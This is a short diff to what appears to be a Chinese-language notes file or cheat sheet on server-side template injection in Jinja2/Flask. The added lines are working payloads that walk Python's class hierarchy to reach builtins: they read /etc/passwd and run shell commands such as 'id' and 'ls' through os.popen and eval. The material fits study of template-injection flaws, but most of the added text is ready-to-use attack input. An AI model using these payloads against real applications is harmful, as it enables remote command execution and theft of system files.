@@ -108,6 +108,16 @@ your input object基类的子类
      {% endfor %} 
   {% endif %}
 {% endfor %}
+
+
+#读取文件与写文件类
+{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27/etc/passwd%27).read()}}
+#执行命令
+{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('id').read()")}}
+#命令执行：
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls').read()") }}{% endif %}{% endfor %}
+#文件操作
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
 ```
 
 若经过{{''.__class__.__base__.__subclasses__()}}查询存在的类和位置后，可以借助的类反射调用方法：
